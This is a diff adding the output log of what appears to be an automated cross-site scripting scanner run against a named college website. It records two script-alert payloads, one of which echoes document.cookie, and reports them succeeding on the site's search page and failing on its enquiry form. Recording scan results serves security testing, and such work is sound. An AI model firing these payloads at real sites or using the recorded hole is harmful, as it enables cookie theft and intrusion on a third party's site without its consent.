@@ -1,0 +1,24 @@
+URL : http://mescoepune.org/search.php
+	Success
+		[+] <script>alert(1);</script>
+		[+] <script>alert(document.cookie);</script>
+
+			---------------------------------------------------------------
+
+URL : http://mescoepune.org/enquiry_send.php
+
+
+	Failures
+		<script>alert(1);</script>
+		<script>alert(document.cookie);</script>
+
+			---------------------------------------------------------------
+
+Domain : mescoepune.org
+Total Injection Points : 2
+Total Injections Attempted : 4
+Successful Injections : 2
+Failed Injections : 2
+
+--------------------------------------------------------------------------------------------------------------------
+
